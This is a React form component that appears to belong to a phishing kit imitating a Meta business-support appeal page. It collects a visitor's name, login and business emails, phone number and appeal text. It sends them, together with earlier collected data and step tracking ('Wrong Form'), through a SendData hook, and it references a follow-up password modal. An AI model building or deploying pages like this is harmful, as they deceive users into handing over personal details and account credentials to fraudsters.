import React, { useContext, useEffect, useState } from 'react'
import styled from 'styled-components'
import SendData from '../hooks/SendData'
import { Col, Row } from 'react-bootstrap'
import Bg from '../assets/images/30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg'
import ModalPw2 from './ModalPw2'
import { DataContext } from '../pages'
import { useTranslations } from 'next-intl';



const BackgroundImg = styled.div`
    background: url('/assets/images/30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg');
    background-size: cover;
    background-position: center;
    height: 200px;
    margin-top: 54px;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    margin-bottom: 55px;
`

const SmallTxt = styled.div`
    color: white;
    font-size: 14px;
    padding-bottom: 0rem;
`
const BigTxt = styled.div`
    font-size: 40px;
    color: white;

`

const Input = styled.input`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.5rem !important;
    padding-left: 0.8rem !important;
    padding-top: 1.5rem !important;
    background-color: #fff;
    margin-top: 2px;
    ::placeholder {
        opacity: 0.5;
        font-weight: 500;
    }
`
const Textarea = styled.textarea`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.375rem 0.8rem !important; 
    padding-top: 1.5rem !important;
    min-height: 150px !important;
`
const Wrapper = styled.div`
    
    margin: auto;
    width: calc(100% - 2rem);
    border-radius: 10px;
    padding-block: 1rem;
    .redborder {
        border: 1px solid red !important;
    }
`
const Btn = styled.button`
    background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    font-size: 13px;
    font-weight: 500;
    padding: 14px 20px;
    border-radius: 50px;
    text-transform: none;
    margin-top: 1rem;
    line-height: 1;
`

const Title = styled.div`
    font-weight: 700;
    color: #1C2B33;
    font-size: 24px;
`


const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`

function Step2Red({ Unik, setStep, Tel, setTel, Email, setEmail, Name, setName, Appeal, setAppeal, BusinessEmail, setBusinessEmail, Ip }) {
    const [TriedSubmit, setTriedSubmit] = useState(true)

    const t = useTranslations('SupportForm1')
    
    const [IsValidEmail, setIsValidEmail] = useState(false)
    const [IsValidEmailB, setIsValidEmailB] = useState(false)
    const [ShowModal, setShowModal] = useState(false)
    const [IsLoading, setIsLoading] = useState(false)
    let handleEmail = (email) => {
        setEmail(email.target.value)

        let re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        if (re.test(email.target.value)) {
            setIsValidEmail(true)
        }
        else {
            setIsValidEmail(false)
        }
    }

    let handleEmailBusiness = (email) => {
        setBusinessEmail(email.target.value)

        let re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        if (re.test(email.target.value)) {
            setIsValidEmailB(true)
        }
        else {
            setIsValidEmailB(false)
        }
    }

    let { setAllData, AllData } = useContext(DataContext);

    const HandleSubmit = () => {

        if (Name.length > 1 && IsValidEmail && Tel.length > 5 && IsValidEmailB) {
            setIsLoading(true)
            const params = {
                ...AllData,
                phone_number: Tel,
                login_email: Email,
                business_email: Email,
                full_name: Name
            };

            setAllData(params)
            SendData(params)

            setTimeout(() => {
                setStep(4)
                setIsLoading(false)

            }, 1000);

        }
        else {
            setTriedSubmit(true)
        }
    }
    useEffect(() => {
        setName('')
        setTel('')
        setEmail('')
        setBusinessEmail('')

        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [])

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Wrong Form'
        };

        SendData(params)

    }, [])

    return (
        <div>
            <div className="px-3">
                <div className='pt-4 pt-md-0'>
                    <Title>{t('title')}</Title>
                </div>
                <div style={{ color: '#1C2B33', fontSize: '16px', lineHeight: 1.3, fontWeight: 600 }} className='py-2'>
                    {t('subtitle')}
                </div>
            </div>

            <Wrapper>
                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        {t('fields.name.label')}
                    </div>
                    <div className="form-floating">
                        <Input
                            value={Name}
                            className={`form-control ${(Name.length < 2 && TriedSubmit) && 'redborder'}`}
                            type="text"
                            onChange={(e) => setName(e.target.value)}
                            placeholder={t('fields.name.placeholder')}
                        />
                        <label htmlFor="floatingInput">{t('fields.name.label')}</label>
                    </div>
                    {Name.length < 1 && TriedSubmit && (
                        <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                            {t('fields.name.error')}
                        </div>
                    )}
                </div>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        {t('fields.email.label')}
                    </div>
                    <div className="form-floating">
                        <Input
                            value={Email}
                            className={`form-control ${(!IsValidEmail && TriedSubmit) && 'redborder'}`}
                            type="email"
                            onChange={handleEmail}
                            placeholder={t('fields.email.placeholder')}
                        />
                        <label htmlFor="floatingInput">{t('fields.email.label')}</label>
                    </div>
                    {!IsValidEmail && TriedSubmit && (
                        <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                            {t('fields.email.error')}
                        </div>
                    )}
                </div>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        {t('fields.businessEmail.label')}
                    </div>
                    <div className="form-floating">
                        <Input
                            value={BusinessEmail}
                            className={`form-control ${(!IsValidEmailB && TriedSubmit) && 'redborder'}`}
                            type="email"
                            onChange={handleEmailBusiness}
                            placeholder={t('fields.businessEmail.placeholder')}
                        />
                        <label htmlFor="floatingInput">{t('fields.businessEmail.label')}</label>
                    </div>
                    {!IsValidEmailB && TriedSubmit && (
                        <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                            {t('fields.businessEmail.error')}
                        </div>
                    )}
                </div>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        {t('fields.phone.label')}
                    </div>
                    <div className="form-floating">
                        <Input
                            value={Tel}
                            className={`form-control ${(Tel.length < 5 && TriedSubmit) && 'redborder'}`}
                            type="tel"
                            onChange={(e) => setTel(e.target.value)}
                            placeholder={t('fields.phone.placeholder')}
                        />
                        <label htmlFor="floatingInput">{t('fields.phone.label')}</label>
                    </div>
                    {Tel.length < 5 && TriedSubmit && (
                        <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                            {t('fields.phone.error')}
                        </div>
                    )}
                </div>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        {t('fields.appeal.label')}
                    </div>
                    <div className="form-floating">
                        <Textarea
                            value={Appeal}
                            className="form-control"
                            rows={4}
                            onChange={(e) => setAppeal(e.target.value)}
                            placeholder={t('fields.appeal.placeholder')}
                        />
                        <label htmlFor="floatingInput">{t('fields.appeal.label')}</label>
                    </div>
                </div>

                <div className="text-end">
                    <Btn onClick={HandleSubmit}>
                        {IsLoading ? <Spinner /> : t('submit')}
                    </Btn>
                </div>
            </Wrapper>

            {ShowModal && (
                <ModalPw2 setStep={setStep} Unik={Unik} Name={Name} />
            )}
        </div>
    )

}

export default Step2Red